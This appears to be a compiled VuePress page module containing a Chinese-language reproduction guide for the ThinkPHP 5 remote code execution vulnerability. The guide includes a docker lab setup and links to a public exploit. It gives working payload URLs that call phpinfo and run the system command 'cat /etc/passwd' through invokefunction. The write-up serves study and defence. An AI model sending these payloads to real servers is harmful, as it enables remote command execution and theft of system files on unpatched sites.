import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r,o,c as p,a as e,b as t,d as n,e as c}from"./app-58e4a7d6.js";const h={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),s=e("p",null,"ThinkPHP 是一款运用极广的 PHP 开发框架。其版本 5 中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。",-1),d=e("p",null,"参考链接：",-1),u={href:"http://www.thinkphp.cn/topic/60400.html",target:"_blank",rel:"noopener noreferrer"},_={href:"http://www.thinkphp.cn/topic/60390.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://xz.aliyun.com/t/3570",target:"_blank",rel:"noopener noreferrer"},f=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>运行 ThinkPHP 5.0.20 版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8080</code> 即可看到 ThinkPHP 默认启动页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接访问 <code>http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code>，即可执行 phpinfo：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021504893.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行系统命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021505433.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="开源-poc-exp" tabindex="-1"><a class="header-anchor" href="#开源-poc-exp" aria-hidden="true">#</a> 开源 POC/EXP</h2>`,11),k={href:"https://github.com/sukabuliet/ThinkphpRCE",target:"_blank",rel:"noopener noreferrer"};function g(x,b){const a=r("ExternalLinkIcon");return o(),p("div",null,[l,s,d,e("ul",null,[e("li",null,[e("a",u,[t("http://www.thinkphp.cn/topic/60400.html"),n(a)])]),e("li",null,[e("a",_,[t("http://www.thinkphp.cn/topic/60390.html"),n(a)])]),e("li",null,[e("a",m,[t("https://xz.aliyun.com/t/3570"),n(a)])])]),f,e("ul",null,[e("li",null,[e("a",k,[t("https://github.com/sukabuliet/ThinkphpRCE"),n(a)])])])])}const P=i(h,[["render",g],["__file","ThinkPHP5 5.0.22 5.1.29 远程代码执行漏洞.html.vue"]]);export{P as default};
